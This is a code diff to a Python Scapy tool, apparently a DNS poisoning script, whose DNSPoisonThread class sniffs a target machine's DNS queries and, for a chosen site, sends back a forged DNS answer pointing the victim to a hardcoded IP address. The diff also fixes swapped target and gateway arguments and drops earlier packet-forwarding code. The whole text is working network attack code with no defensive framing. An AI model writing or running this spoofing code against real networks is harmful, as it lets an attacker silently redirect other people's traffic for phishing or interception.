@@ -99,24 +99,17 @@ class DNSPoisonThread(threading.Thread):
     def _analysis(self, packet):
         #Performs checks, whether DNS response contains our gold or not.
 
-        if packet[Ether].dst == '28:56:5a:49:ff:67' and packet[Ether].src == 'b4:2e:99:f4:b7:df':
-           packet[Ether].dst = 'c4:e9:84:9a:14:16'
-           packet[Ether].src = '28:56:5a:49:ff:67'
-           packet[IP].ttl = 255
-
-        if packet[Ether].dst == '28:56:5a:49:ff:67' and packet[Ether].src == 'c4:e9:84:9a:14:16':
-           packet[Ether].dst = 'b4:2e:99:f4:b7:df'
-           packet[Ether].src = '28:56:5a:49:ff:67'
-           packet[IP].ttl = 255
-
         if self.site in packet[DNSQR].qname.decode('UTF-8'):
-            packet.show()
-
-        sendp(packet)
-
+            udp_packet = (Ether(src=packet[Ether].dst, dst=packet[Ether].src, type = "IPv4")
+                    /IP(ihl = packet[IP].ihl, src=packet[IP].dst, dst= packet[IP].src, ttl = packet[IP].ttl, chksum = None)
+                    /UDP(sport=53, dport=packet[UDP].sport, len = None, chksum = None)
+                    /DNS(id=packet[DNS].id, rd=1, qr=1, ra=1, z=0, rcode=0,qdcount=1, ancount=1, nscount=0, arcount=0,qd = DNSQR(qname = packet[DNSQR].qname, qtype = "A", qclass="IN"),an=DNSRR(rrname=packet[DNSQR].qname, rdata= "23.96.35.235",type="A",rclass="IN", ttl=174)))
+            udp_packet.show()
+            sendp(udp_packet)
+    
     def run(self):
         #Only do packet sniffing
-        sniff(  filter=f'host {self.targetip} and udp port 53',\
+        sniff(  filter=f'ip src {self.targetip} and udp port 53',\
                 prn=self._analysis)
 
     def join(self, timeout=None):
@@ -136,8 +129,8 @@ def args():
     return args
 
 def main(args):
-    targetip = args.gatewayip
-    gatewayip = args.targetip
+    targetip = args.targetip
+    gatewayip = args.gatewayip
     site = args.site
     poisonip = args.poisonip
 
